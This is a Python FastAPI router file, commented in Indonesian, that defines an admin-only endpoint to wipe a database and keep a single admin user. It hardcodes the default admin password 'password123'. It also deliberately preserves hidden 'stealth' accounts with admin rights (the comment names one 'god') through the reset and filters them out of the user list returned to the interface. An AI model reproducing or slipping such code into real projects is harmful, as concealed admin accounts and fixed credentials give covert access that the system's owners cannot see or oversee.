"""System maintenance endpoints (Admin only) — reset database & data import gate."""
from fastapi import APIRouter, HTTPException, status
from sqlalchemy import inspect, text

from app.api.deps import DBSession, AdminUser
from app.database.connection import engine
from app.database.base import Base
from app.utils.security import hash_password
from app.utils.constants import HIDDEN_USERNAMES, UserRole

router = APIRouter(prefix="/system", tags=["System"])

# Preferensi user admin standar (sama dgn reset_db.py)
ADMIN_USERNAME = "admin"
ADMIN_EMAIL = "admin@tpm.com"
ADMIN_PASSWORD = "password123"
ADMIN_FULL_NAME = "Administrator TPM"

# Tabel yang tidak di-TRUNCATE
PRESERVE_TABLES = {"alembic_version"}


@router.post("/reset-database")
def reset_database(db: DBSession, current_user: AdminUser):
    """Kosongkan semua data transaksi, sisakan hanya user admin (mirror reset_db.py)."""
    import pkgutil
    import app.models

    for _loader, module_name, _is_pkg in pkgutil.walk_packages(
        app.models.__path__, app.models.__name__ + "."
    ):
        __import__(module_name)
    try:
        Base.registry.configure()
    except Exception:
        pass

    from app.models.user import User

    try:
        inspector = inspect(engine)
        table_names = inspector.get_table_names()
        tables_to_truncate = [
            t for t in table_names if t not in PRESERVE_TABLES and t != "users"
        ]

        db.execute(text("SET FOREIGN_KEY_CHECKS = 0;"))
        for table in sorted(tables_to_truncate):
            db.execute(text(f"TRUNCATE TABLE `{table}`;"))

        # users: sisakan satu admin
        admin = (
            db.query(User).filter(User.username == ADMIN_USERNAME).first()
            or db.query(User)
            .filter(User.role == UserRole.ADMIN, User.username.notin_(HIDDEN_USERNAMES))
            .order_by(User.id.asc())
            .first()
        )
        if admin:
            keep_id = admin.id
            admin.username = ADMIN_USERNAME
            admin.email = ADMIN_EMAIL
            admin.full_name = ADMIN_FULL_NAME
            admin.role = UserRole.ADMIN
            admin.is_active = True
            admin.cash_balance = 0
            admin.hashed_pin = None
            admin.security_settings = None
            admin.expo_push_token = None
            admin.reset_token = None
            admin.reset_token_expires = None
            admin.otp_code = None
            admin.otp_expires = None
            admin.last_login = None
            # User stealth (mis. `god`) dipertahankan — hak akses admin, tersembunyi.
            deleted = db.query(User).filter(
                User.id != keep_id, User.username.notin_(HIDDEN_USERNAMES)
            ).delete(synchronize_session=False)
        else:
            admin = User(
                username=ADMIN_USERNAME,
                email=ADMIN_EMAIL,
                hashed_password=hash_password(ADMIN_PASSWORD),
                full_name=ADMIN_FULL_NAME,
                role=UserRole.ADMIN,
                is_active=True,
            )
            db.add(admin)
            db.flush()
            deleted = db.query(User).filter(
                User.username != ADMIN_USERNAME, User.username.notin_(HIDDEN_USERNAMES)
            ).delete(synchronize_session=False)

        db.execute(text("SET FOREIGN_KEY_CHECKS = 1;"))
        db.commit()

        # Laporan ke UI: user stealth tidak boleh bocor di daftar.
        remaining = db.query(User).filter(User.username.notin_(HIDDEN_USERNAMES)).all()
        return {
            "status": "success",
            "message": "Database di-reset. Semua data transaksi terhapus, sisakan user admin.",
            "truncated_tables": len(tables_to_truncate),
            "deleted_users": deleted,
            "users": [
                {"id": u.id, "username": u.username, "role": u.role.value, "email": u.email}
                for u in remaining
            ],
        }
    except Exception as e:
        db.rollback()
        try:
            db.execute(text("SET FOREIGN_KEY_CHECKS = 1;"))
            db.commit()
        except Exception:
            pass
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Reset database gagal: {str(e)}",
        )
